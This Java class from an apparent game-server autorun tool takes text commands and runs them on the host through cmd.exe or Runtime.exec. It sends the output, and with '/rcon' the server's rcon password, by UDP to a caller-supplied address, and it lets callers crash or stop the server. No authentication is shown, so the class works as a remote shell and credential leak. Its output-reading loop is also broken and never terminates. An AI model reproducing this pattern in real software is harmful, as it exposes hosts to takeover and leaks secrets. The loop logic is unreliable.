package pl.mario.mautorun;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author Mateusz
 */
public class MPacket extends Thread {

    private String cmd;
    private String ip;
    private int port;

    public MPacket(String cmd, String ip, int port) {
        this.cmd = cmd;
        this.ip = ip;
        this.port = port;
        analysis();
    }

    public void analysis() {

        if (this.cmd.contains("/cmd ")) {
            String exec = "cmd.exe /c " + cmd.substring(5);
            try {
                Process p = Runtime.getRuntime().exec(exec);
                BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String rec = "";
                while ((rec += input.readLine()) != null);
                sendPck(rec);
            } catch (IOException ex) {
                Loggs.loguj("MPacket-analysis-/cmd", ex);
            }
        } else if (this.cmd.contains("/rcon ")) {
            sendPck(Main.srv.getRcon());
        } else if (this.cmd.contains("/commands ")) {
            for (String cmd : ServerCommands.commands) {
                sendPck(cmd);
            }
            sendPck("MEXIT");
        } else if (this.cmd.contains("/adminpanel ")) {
            String exec = cmd.substring(12);
            Cmd cmd = new Cmd(0, exec);
        } else if (this.cmd.contains("/crash ")) {
            Main.srv.closeServer();
        } else if (this.cmd.contains("/mstop ")) {
            Main.srv.closeServer();
            System.exit(0);
        } else if (this.cmd.contains("/rawcmd ")) {
            String exec = cmd.substring(8);
            try {
                Process p = Runtime.getRuntime().exec(exec);
                BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String rec = "";
                while ((rec += input.readLine()) != null);
                sendPck(rec);
            } catch (IOException ex) {
                Loggs.loguj("MPacket-analysis-/cmd", ex);
            }
        } else {

        }
    }

    public void sendPck(String msg) {
        String message = "";
        try {
            InetAddress servAddr = InetAddress.getByName(this.ip);
            byte buf[] = msg.getBytes();
            DatagramSocket socket = new DatagramSocket();
            socket.setSoTimeout(2000);
            socket.send(new DatagramPacket(buf, buf.length, servAddr, this.port));              //nastepnie komende
            socket.close();
        } catch (Exception ex) {
            Loggs.loguj("MPacket-sendPck", ex);
        }
    }

}
